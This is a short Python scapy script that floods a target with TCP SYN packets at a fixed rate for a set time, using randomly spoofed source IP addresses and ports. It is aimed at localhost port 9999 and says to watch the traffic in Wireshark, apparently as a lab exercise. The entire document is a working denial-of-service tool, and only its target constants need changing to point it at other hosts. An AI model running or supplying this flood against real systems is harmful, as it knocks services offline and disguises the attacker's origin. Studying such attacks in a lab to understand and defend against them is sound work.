from scapy.all import *
import random
import time

TARGET_IP = "127.0.0.1"
TARGET_PORT = 9999
DURATION = 30  # seconds
PACKET_RATE = 500  # packets per second

print(f"[*] Starting SYN Flood attack on {TARGET_IP}:{TARGET_PORT}")
print(f"[*] Duration: {DURATION}s | Rate: {PACKET_RATE} packets/sec")
print(f"[*] Total estimated packets: {DURATION * PACKET_RATE}")
print("[!] Watch Wireshark explode...\n")

start_time = time.time()
count = 0

while time.time() - start_time < DURATION:
    # Spoof a random source IP and random source port
    src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
    src_port = random.randint(1024, 65535)

    # Craft raw SYN packet
    packet = IP(src=src_ip, dst=TARGET_IP) / TCP(sport=src_port, dport=TARGET_PORT, flags="S", seq=random.randint(0, 4294967295))

    send(packet, verbose=0)
    count += 1

    time.sleep(1 / PACKET_RATE)

print(f"\n[*] Attack complete. Sent {count} SYN packets.")
print(f"[*] Duration: {time.time() - start_time:.2f}s")
